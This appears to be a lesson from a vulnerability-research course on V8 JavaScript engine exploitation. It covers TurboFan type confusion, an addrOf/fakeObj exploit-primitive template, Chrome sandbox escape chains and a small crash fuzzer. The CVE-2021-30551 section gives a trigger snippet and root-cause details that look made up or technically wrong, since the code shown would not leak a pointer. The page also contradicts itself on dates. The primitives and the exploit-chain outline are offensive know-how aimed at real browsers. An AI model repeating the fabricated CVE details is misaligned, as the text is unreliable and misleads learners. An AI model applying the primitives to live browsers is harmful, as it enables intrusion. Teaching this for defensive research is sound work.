---
title: "Day 735 — Browser Security and JavaScript Engine Bug Hunting"
tags: [browser-security, javascript-engine, v8, jit, type-confusion,
  turbofan, chakra, pwn2own, module-12-post-gate]
module: 12-PostGate
day: 735
prerequisites:
  - Day 734 — Hypervisor Security
  - Day 682 — JavaScript Engine Vulnerability Intro (Module 10)
  - Day 671 — Bug Class: Type Confusion
related_topics:
  - Day 736 — AI and ML Security
---

# Day 735 — Browser Security and JavaScript Engine Bug Hunting

> "Browser exploits are how you get into a locked network with no other
> entry point. The target visits a page. You get code execution. That is
> the most powerful initial access vector that exists. And the JavaScript
> engine is the richest attack surface inside the browser. Every
> optimisation the JIT compiler makes is a new opportunity for type
> confusion."
>
> — Ghost

---

## Goals

1. Understand the JavaScript engine pipeline: parsing → AST → bytecode →
   JIT compilation → optimised machine code.
2. Understand how V8's TurboFan optimiser produces type confusions and why
   they are exploitable.
3. Build a minimal JavaScript fuzzer to explore V8 behaviour.
4. Study two real V8 CVEs at the source code level.
5. Understand browser sandbox architecture and what it means for exploit chains.

---

## Prerequisites

- Day 682 (JavaScript Engine Vulnerability Intro), Day 671 (Type Confusion).
- Node.js or V8 built from source for testing.
- Ghidra for binary analysis of JavaScript engine builds.

---

## 1 — The JavaScript Engine Pipeline

```
JS ENGINE PIPELINE (V8 — Chrome/Node.js)

Source code → [Parser] → AST (Abstract Syntax Tree)
          → [Ignition] → Bytecode (interpreted)
          → [TurboFan] → Optimised machine code (JIT compiled)
          → [Deoptimisation] → Back to bytecode if type assumption fails

IGNITION: The bytecode interpreter.
  Collects type feedback — what types appear at each operation over time.
  Feeds this feedback to TurboFan.

TURBOFAN: The JIT optimising compiler.
  Uses type feedback to make assumptions:
  "This variable has always been an integer — I will emit integer ops."
  If the assumption is wrong → deoptimise.
  If the ASSUMPTION IS WRONG BUT DEOPTIMISATION IS NOT TRIGGERED → TYPE CONFUSION

THE SECURITY INSIGHT:
  TurboFan's type inference can be tricked into believing a value is type A
  when it is actually type B. If this state is reached and the JIT-compiled
  code runs with that false assumption, memory accesses based on the wrong
  type layout become attacker-controlled memory reads/writes.
```

---

## 2 — V8 Object Representation

Understanding V8's object model is prerequisite to understanding V8 exploits.

### 2.1 Tagged Values

```
V8 VALUE REPRESENTATION (64-bit)

Smi (Small Integer):
  Stored as: (value << 1) | 0
  Examples: 0 → 0x0, 1 → 0x2, 5 → 0xa
  Bit 0 is 0 → Smi

HeapObject pointer:
  Stored as: address | 1
  Bit 0 is 1 → heap pointer (subtract 1 to get actual address)

Reading a JS integer:
  If val & 1 == 0: Smi value = val >> 1
  If val & 1 == 1: HeapObject at address (val - 1)
```

### 2.2 JavaScript Array Types

```
V8 ELEMENT KINDS (array backing stores)

PACKED_SMI_ELEMENTS   → all elements are Smi
PACKED_DOUBLE_ELEMENTS → all elements are doubles (64-bit float)
PACKED_ELEMENTS       → elements can be any JS object

HOLEY_DOUBLE_ELEMENTS → doubles with holes (undefined slots)
HOLEY_ELEMENTS        → objects with holes

TYPE CONFUSION TARGET:
  If TurboFan believes an array is PACKED_SMI_ELEMENTS (integers)
  but it is actually PACKED_DOUBLE_ELEMENTS (floats):
  → Reading a double as Smi interprets the 64-bit float bits as
    a pointer value → ASLR bypass (information disclosure)
  → Writing an integer as double stores pointer bits as a float
    → arbitrary write (if the "integer" is an attacker-controlled address)
```

---

## 3 — CVE Study: CVE-2021-30551 — V8 Type Confusion

```
CVE-2021-30551 — V8 TYPE CONFUSION (Chrome < 91.0.4472.77)

REPORTER: Sergei Glazunov (Google Project Zero)
DISCLOSURE DATE: 2021-06-03
CVSS: 8.8 (High) — Remote Code Execution via crafted HTML
EXPLOITATION: Exploited in the wild before patch

ROOT CAUSE:
  In TurboFan's JSNativeContextSpecialization::ReduceJSLoadNamed,
  the compiler assumed that the type of an object property could not
  change between the type-inference phase and the code-generation phase.
  A carefully constructed feedback-pollution pattern caused the compiler
  to emit a load instruction treating a HeapObject as a Smi.

EXPLOIT PRIMITIVE:
  // JavaScript to trigger the confusion:
  function victim(arr) {
      return arr[0] + 1;  // TurboFan sees: Smi + 1
  }
  // Feed it Smi values many times to train TurboFan:
  for (let i = 0; i < 100000; i++) { victim([1, 2, 3]); }
  // Now feed it an object array — TurboFan's assumption is wrong:
  let obj = {x: 1};
  let result = victim([obj]);
  // result = (HeapObject_address >> 1) + 1 → pointer leak

WHAT THIS GIVES YOU:
  1. addrOf(obj): leak the heap address of any JS object
     → ASLR bypass for heap
  2. fakeObj(addr): make V8 treat an arbitrary address as a JS object
     → read/write at attacker-controlled heap addresses
  These two primitives together = arbitrary read/write = RCE
```

---

## 4 — The addrOf / fakeObj Primitives

These are the two building blocks of almost every V8 type confusion exploit:

```javascript
// Simplified template — actual gadgets are CVE-specific
// This pattern appears in almost every V8 exploit since 2018

let float_arr = [1.1, 2.2];  // PACKED_DOUBLE_ELEMENTS
let obj_arr = [{}];           // PACKED_ELEMENTS

// The confusion: TurboFan thinks obj_arr is float_arr's layout
// (achieved via the type confusion CVE — not shown in full detail)

// addrOf: get the V8 heap address of any JS object
function addrOf(obj) {
    obj_arr[0] = obj;       // store object in obj_arr
    return float_arr[0];    // read it as a double → contains address bits
}

// fakeObj: make V8 treat an arbitrary address as a JS object
function fakeObj(addr) {
    float_arr[0] = addr;    // store address bits as double
    return obj_arr[0];      // read as object → V8 trusts this address as heap ptr
}

// Arbitrary write using a fake ArrayBuffer:
let victim_buffer = new ArrayBuffer(0x1000);
let dataview = new DataView(victim_buffer);

let fake_ab_addr = addrOf(victim_buffer);
// Overwrite ArrayBuffer's backing store pointer via fakeObj + DataView trick
// ... (exploit-specific gadget chain)
```

---

## 5 — Browser Sandbox Architecture

Exploiting the JS engine is only Phase 1. The browser runs in a sandbox:

```
CHROME SANDBOXING MODEL

Browser Process (privileged):
  → System calls allowed: nearly all
  → Access: filesystem, network, UI

Renderer Process (sandboxed):
  → JS engine + DOM + page content
  → Syscall filter: seccomp-bpf on Linux, restricted on Windows
  → NO direct filesystem, camera, microphone, clipboard access
  → Communicates with Browser process via IPC (Mojo protocol)

GPU Process (partially sandboxed):
  → Handles graphics rendering
  → Has historically had weaker sandboxing

WHAT A JS ENGINE EXPLOIT GIVES YOU:
  Code execution INSIDE the Renderer sandbox
  → You can run arbitrary code in the renderer
  → You CANNOT directly touch files, network sockets, or the OS
  → You need a sandbox escape (second stage) for full control

SANDBOX ESCAPE TARGETS:
  Mojo IPC handlers in the Browser process
  → If the Browser process trusts the renderer's IPC data without validation:
     → Browser process handles filesystem I/O → renderer writes files
  GPU process attacks
  → Historically more accessible (fewer syscall restrictions)

FULL CHAIN:
  JS Engine CVE → renderer RCE → Mojo/GPU escape → Browser process RCE
  → Privilege escalation (Day 733 / Day 732) → OS compromise
```

---

## 6 — Minimal JS Engine Fuzzer

```javascript
// minimal_v8_fuzzer.js — run with: node --allow-natives-syntax fuzzer.js
// Generates random JS snippets and checks for crashes

const { execSync, spawnSync } = require('child_process');
const fs = require('fs');

// Seed corpus of V8-interesting patterns
const SEEDS = [
    'let a = [1.1]; a[0] = {};',
    'function f(x) { return x[0] + 1; } for(let i=0;i<10000;i++) f([1]); f([{}]);',
    'let a = new Array(2**30);',
    'let p = new Proxy({}, { get: () => 1.1 }); p[0];',
    '({[Symbol.toPrimitive]: () => {}}) + 1;',
];

// Mutation operators
function mutate(seed) {
    const mutations = [
        s => s.replace(/\d+/g, () => Math.floor(Math.random() * 2**31)),
        s => s.replace(/\[\]|\{\}/, () => Math.random() > 0.5 ? '[]' : '{}'),
        s => s + '\n' + SEEDS[Math.floor(Math.random() * SEEDS.length)],
    ];
    return mutations[Math.floor(Math.random() * mutations.length)](seed);
}

function runAndCheck(code) {
    fs.writeFileSync('/tmp/fuzz_case.js', code);
    const result = spawnSync('node', ['/tmp/fuzz_case.js'], { timeout: 2000 });
    if (result.signal === 'SIGSEGV' || result.signal === 'SIGABRT') {
        fs.writeFileSync(`/tmp/crash_${Date.now()}.js`, code);
        console.log('[!] CRASH:', result.signal);
    }
}

// Fuzz loop
let corpus = [...SEEDS];
for (let i = 0; i < 10000; i++) {
    const seed = corpus[Math.floor(Math.random() * corpus.length)];
    const testcase = mutate(seed);
    runAndCheck(testcase);
    if (i % 100 === 0) process.stdout.write('.');
}
console.log('\nDone.');
```

---

## Key Takeaways

1. **The addrOf/fakeObj primitive pair is the lingua franca of V8 exploitation.**
   Once you have a type confusion that lets you read a HeapObject pointer as a
   double, and write a double as a HeapObject pointer, you have arbitrary heap
   read/write. Every V8 exploit since ~2016 builds on this pair.
2. **TurboFan's optimism is its vulnerability.** The JIT compiler makes type
   assumptions to generate fast code. Exploiters create scenarios where those
   assumptions are valid during training but invalid during exploitation. This
   is the pattern to look for in any JIT compiler.
3. **A browser exploit is a two-stage weapon.** Stage 1 is the JS engine RCE.
   Stage 2 is the sandbox escape. Real browser exploits (Pwn2Own, in-the-wild)
   always chain both. Understanding both stages is required to evaluate the
   full impact of any browser CVE.
4. **Browser JS engine research is the highest-return VR investment in the
   consumer security space.** Chrome's VRP pays $20,000+ for V8 RCE. A Pwn2Own
   V8 chain has paid $200,000+. The attack surface is consistent, the code is
   open source, and the tooling (d8, ASAN V8 builds) is accessible.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q735.1, Q735.2 …).

---

## Navigation

← Previous: [Day 734 — Hypervisor Security](DAY-0734-Hypervisor-Security.md)
→ Next: [Day 736 — AI and Machine Learning Security](DAY-0736-AI-ML-Security.md)
